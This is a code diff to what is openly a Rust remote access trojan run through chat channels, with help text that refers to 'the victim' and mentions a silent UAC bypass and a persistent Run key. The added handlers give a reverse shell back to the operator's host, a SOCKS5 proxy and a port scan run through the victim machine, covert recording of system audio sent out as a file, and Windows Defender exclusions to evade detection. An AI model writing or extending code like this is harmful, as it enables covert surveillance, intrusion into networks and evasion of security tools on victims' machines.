@@ -46,6 +46,13 @@ const HELP: &str = "\
 !toast <text>              Windows toast notification
 !clear [info|files]        delete messages in #console (or #information / #files)
 !uac [silent|disable]      request admin (default: UAC prompt; silent = no-prompt bypass)
+!net                       live connections + owning process
+!portscan <ip> <ports>     TCP connect scan from the victim
+!revshell <host> [port]    interactive cmd shell back to you
+!proxy [port]              SOCKS5 proxy through the victim (default 1080)
+!audio [secs]              record system audio (speaker loopback)
+!open <url>                open a URL in the default browser
+!defender [add|remove <p>] Defender status / exclusions
 !lock                      lock workstation
 !update                    pull newest build from #update and restart
 !uninstall                 remove payload + launcher + Run key, then stop
@@ -392,6 +399,82 @@ pub async fn dispatch(
             let n = st.purge_channel(&target).await.unwrap_or(0);
             st.send(console, &format!("cleared {n} message(s) in #{label}"))
                 .await?;
+        }
+        "net" | "connections" => {
+            let r = tokio::task::spawn_blocking(host::net_connections).await?;
+            st.send_code(console, &r).await?;
+        }
+        "portscan" => {
+            let mut it = arg.split_whitespace();
+            let target = it.next().unwrap_or("").to_string();
+            let ports = it.next().unwrap_or("1-1024").to_string();
+            if target.is_empty() {
+                st.send(console, "usage: !portscan <ip> <ports>").await?;
+            } else {
+                st.send(console, &format!("scanning {target} {ports} ...")).await?;
+                let (open, scanned) = crate::net::portscan(&target, &ports).await?;
+                let list = open
+                    .iter()
+                    .map(|p| p.to_string())
+                    .collect::<Vec<_>>()
+                    .join(", ");
+                let list = if list.is_empty() { "none".to_string() } else { list };
+                st.send_code(
+                    console,
+                    &format!("{}/{} open: {list}", open.len(), scanned.len()),
+                )
+                .await?;
+            }
+        }
+        "revshell" => {
+            let parts: Vec<&str> = arg.split_whitespace().collect();
+            let host = parts.first().map(|s| s.to_string()).unwrap_or_default();
+            let port: u16 = parts.get(1).and_then(|p| p.parse().ok()).unwrap_or(4444);
+            if host.is_empty() {
+                st.send(console, "usage: !revshell <host> [port]").await?;
+            } else {
+                st.send(console, &format!("connecting back to {host}:{port}"))
+                    .await?;
+                tokio::spawn(async move {
+                    let _ = crate::net::reverse_shell(&host, port).await;
+                });
+            }
+        }
+        "proxy" => {
+            let port: u16 = arg.trim().parse().unwrap_or(1080);
+            tokio::spawn(async move {
+                let _ = crate::net::socks5_proxy(port).await;
+            });
+            st.send(console, &format!("socks5 proxy listening on 0.0.0.0:{port}"))
+                .await?;
+        }
+        "audio" => {
+            let secs: u64 = arg.trim().parse().unwrap_or(10);
+            let bytes =
+                tokio::task::spawn_blocking(move || capture::record_loopback_wav(secs)).await??;
+            st.send_file(files, &format!("audio-{}.wav", stamp()), bytes, "system audio")
+                .await?;
+        }
+        "open" => {
+            if arg.is_empty() {
+                st.send(console, "usage: !open <url>").await?;
+            } else {
+                host::open_url(&arg);
+                st.send(console, "opened").await?;
+            }
+        }
+        "defender" => {
+            let a = arg.trim();
+            if let Some(p) = a.strip_prefix("add ") {
+                let r = host::defender_exclude(p.trim(), true);
+                st.send_code(console, &r).await?;
+            } else if let Some(p) = a.strip_prefix("remove ") {
+                let r = host::defender_exclude(p.trim(), false);
+                st.send_code(console, &r).await?;
+            } else {
+                let r = tokio::task::spawn_blocking(host::defender_status).await?;
+                st.send_code(console, &r).await?;
+            }
         }
         "uac" | "elevate" => {
             let a = arg.trim().to_ascii_lowercase();
